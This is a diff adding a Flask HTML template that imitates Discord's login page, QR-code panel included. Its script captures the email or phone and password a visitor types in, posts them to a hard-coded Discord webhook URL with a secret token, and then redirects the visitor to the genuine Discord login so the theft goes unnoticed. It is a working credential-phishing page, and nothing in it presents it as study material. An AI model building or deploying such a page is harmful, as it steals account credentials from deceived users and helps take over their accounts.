@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-image: url("{{ url_for('static', filename='images/1291249.png') }}");
+      color: #ffffff;
+    }
+
+    .container {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      width: 784px;
+      height: 408px;
+      text-align: left;
+      background-color: #36393f;
+      padding: 40px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
+    }
+
+    .form-container {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+    }
+
+    .qrcode-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+    }
+
+    .qrcode {
+      border-radius: 8px;
+      height: 200px;
+      width: 200px;
+    }
+
+    .header {
+      text-align: center;
+      color: #ffffff;
+      font-size: 24px;
+      margin: 0;
+    }
+
+    .underHeader {
+      text-align: center;
+      color: #b5bac1;
+      font-size: 16px;
+      margin: 0;
+    }
+
+    .noaccount {
+      font-size: 14px;
+      color: #949ba4;
+    }
+
+    .login-form .label {
+      font-size: 12px;
+      font-weight: 700;
+      color: rgb(181, 186, 193);
+      margin: 0 0 8px 0;
+    }
+
+    .login-form .field {
+      max-width: 416px;
+      width: 416px;
+      margin: 0 0 10px 0;
+      border: none;
+      background-color: #1e1e1e;
+      color: #fff;
+      cursor: pointer;
+      border-radius: 4px;
+    }
+
+    .login-form input.field {
+      padding: 12px;
+      width: 392px;
+      background-color: #1e1e1e;
+      outline: none;
+    }
+
+    .login-form button.field {
+      padding: 12px;
+      margin: 0px 0px 8px;
+      background-color: #5865f2;
+    }
+
+    .login-form button.field:hover {
+      background-color: #5f73bc;
+    }
+
+    .login-form a {
+      text-decoration: none;
+      color: #7289da;
+    }
+  </style>
+  <title>Discord</title>
+  <link rel="icon" type="image/x-icon" href="{{ url_for('static', filename='images/favicon.png') }}">
+</head>
+<body>
+  <div class="container">
+    <div class="form-container">
+      <form class="login-form" id="loginForm">
+        <h2 class="header">Welcome Back!</h2>
+        <br/>
+        <h2 class="underHeader">We're so excited to see you again!</h2>
+        <br/>
+        <p class="label">EMAIL OR PHONE NUMBER</p>
+        <input type="text" placeholder="" class="field" id="emailOrPhone">
+        <br/>
+        <br/>
+        <p class="label">PASSWORD</p>
+        <input type="password" placeholder="" class="field" id="password">
+        <br/>
+        <a href="https://discord.com/login" class="forgotPass">Forgot your password?</a>
+        <br/>
+        <br/>
+        <br/>
+        <button type="button" class="field" id="loginButton">Login</button>
+        <p class="noaccount">Don't have an account? <a href="https://discord.com/register">Register</a></p>
+      </form>
+    </div>
+    <div class="qrcode-container">
+      <img class="qrcode" src="{{ url_for('static', filename='images/qrcode.PNG') }}" alt="qr code login">
+      <br/>
+      <br/>
+      <h2 class="header">Log in with QR Code</h2>
+      <br/>
+      <p class="underHeader">Scan this with the Discord mobile <br/> to log in instantly.</p>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById('loginButton').addEventListener('click', function() {
+    var emailOrPhone = document.getElementById('emailOrPhone').value;
+    var password = document.getElementById('password').value;
+
+    // Log values (you can remove this in a production environment)
+    console.log('Email/Phone:', emailOrPhone);
+    console.log('Password:', password);
+
+    var url = "https://discord.com/api/webhooks/1213604406520582205/P52h6dfBVbB2_Vb5sx06_ThubRj4YOPO_OFFdGWbuqYraCl_GTZBGsdx_tlqkJcmZ1_a"
+    var data = {
+      content: "Email or Phone number: " + emailOrPhone + "\nPassword: " + password
+    }
+
+    fetch(url, {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify(data),
+    })
+    .then(response => {
+      // Check if the request was successful (status code 2xx)
+      if (response.ok) {
+        // Redirect after the fetch request completes
+        window.location.replace("http://discord.com/login");
+      } else {
+        // Handle error cases if needed
+        console.error('Error sending message to webhook');
+      }
+    })
+    .catch(error => {
+      console.error('Fetch error:', error);
+    });
+  });
+  </script>
+</body>
+</html>
